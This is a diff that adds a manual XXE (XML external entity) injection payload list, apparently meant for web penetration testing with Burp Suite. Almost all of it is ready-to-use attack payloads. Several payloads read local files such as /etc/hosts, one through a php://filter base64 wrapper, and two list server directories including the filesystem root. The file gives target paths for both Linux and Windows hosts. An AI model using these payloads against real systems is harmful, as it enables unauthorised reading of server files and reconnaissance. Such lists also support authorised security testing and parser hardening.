@@ -1,0 +1,52 @@
+# THIS IS MANUAL PAYLOAD LIST 
+## IT WILL NOT WORK WITH INTRUDER
+### FOR LINUX TARGET USE:
+/etc/hosts
+### FOR WINDOWS TARGET USE:
+C:/Windows/win.ini
+
+### ---  --- --- --- ---  ###
+### --- FILE RETRIVAL --- ###
+### ---  --- --- --- ---  ###
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY file SYSTEM "/etc/hosts"> ]>
+<data>&file;</data>
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY file SYSTEM "file:///etc/hosts"> ]>
+<data>&file;</data>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo_target (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/hosts">
+]>
+<foo_target>&file;</foo_target>
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts"> ]>
+<data>&file;</data>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo_target ANY >
+<!ENTITY file SYSTEM "file:///etc/hosts" >]>
+<foo_target>&file;</foo_target>
+
+### ---  --- --- --- --- --- --- ###
+### --- DIRECTORY LISTENING ---  ###
+### ---  --- --- --- --- --- --- ###
+
+## Here you retrieve /root/ :
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE aa[<!ELEMENT bb ANY>
+<!ENTITY xxe SYSTEM "file:///">]>
+<data>&xxe;</data>
+
+## Here you retrieve /etc/ :
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]>
+<data>&xxe;</data>
